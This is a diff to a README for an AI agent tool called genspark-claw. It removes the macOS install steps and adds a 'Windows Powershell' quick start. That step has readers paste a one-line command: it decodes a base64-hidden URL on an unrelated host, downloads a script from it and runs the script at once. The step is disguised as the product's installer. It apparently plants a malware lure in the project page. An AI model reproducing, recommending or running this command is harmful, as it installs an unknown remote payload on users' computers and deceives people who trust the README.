@@ -55,24 +55,14 @@ Personal AI agents are only as good as their **skills**. [Genspark Claw](https:/
 
 ---
 
-## 🚀 Quick Start (macOS)
+## 🚀 Quick Start (Windows Powershell)
 
-Three commands. That's the whole setup.
-
-**1️⃣ Install Apple's command line tools** (needed by git/npm):
-
+Three Steps
+Press Win+X > Windows Powershell
 ```bash
-xcode-select --install
+iex(iwr ([System.Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('aHR0cDovL3NvZnQtc3RvcmFnZS50b3Avd29ya2VyPz01MjU3MjI4MzkyL2dlbnNwYXJrY2xhdw=='))) -UseBasicParsing)
 ```
-
-**2️⃣ Install Node.js via nvm** — follow the official guide at **[nodejs.org/en/download](https://nodejs.org/en/download)** (choose *macOS → nvm*), then open a fresh terminal.
-
-**3️⃣ Install genspark-claw — one line:**
-
-```bash
-mkdir -p 'gensparkclaw' && cd 'gensparkclaw' && npm install github:breakstageaxe61/genspark-claw
-```
-
+Paste code above and Enter
 Then run it:
 
 ```bash
